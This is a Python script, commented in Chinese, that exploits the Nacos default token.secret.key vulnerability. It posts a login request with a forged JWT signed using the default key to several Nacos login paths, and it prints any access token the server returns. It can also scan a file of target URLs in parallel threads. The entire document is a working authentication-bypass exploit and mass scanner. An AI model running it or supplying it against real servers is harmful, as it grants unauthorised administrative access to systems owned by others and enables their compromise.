import argparse
import requests
import threading

# 伪造用户登录时的请求头和请求数据
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6NDA4MTkwNzk5M30.BdQSxmoftt9zePaqO1-B9QFSi1tsiiQ2mzKUjnZfQJk"}

data = {"username": "nacos", "password": "nacos123"}


# 定义函数，用于发起POST请求并判断回显结果，每次调用这个函数发送一个请求
def send_request(url):
    mid_urls = ['', '/nacos', '/home/nocos']
    end_url = '/v1/auth/users/login'
    for mid_url in mid_urls:
        full_url = url + mid_url + end_url
        try:
            response = requests.post(full_url, headers=headers, data=data, timeout=2)
            if response.status_code == 200 and response.json()['accessToken']:
                print(f'{url} 存在token.secret.key默认配置漏洞')
                print(f'{response.json()}')
                return
        except requests.exceptions.RequestException as e:
            print(f'{url} 访问失败 {e}')
            return

    print('不存在token.secret.key默认配置漏洞')


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--url', type=str, default=None, help='nacos地址')
    parser.add_argument('-p', '--path', type=str, default=None, help='nacos地址列表(.txt)')
    args = parser.parse_args()

    if args.url:
        send_request(args.url)

    if args.path:
        # 从url.txt文件中读取URL列表
        with open(args.path, 'r') as f:
            urls = f.read().splitlines()

        threads = []
        for url in urls:
            t = threading.Thread(target=send_request, args=(url,))
            threads.append(t)
            t.start()

        # 等待所有线程完成
        for t in threads:
            t.join()
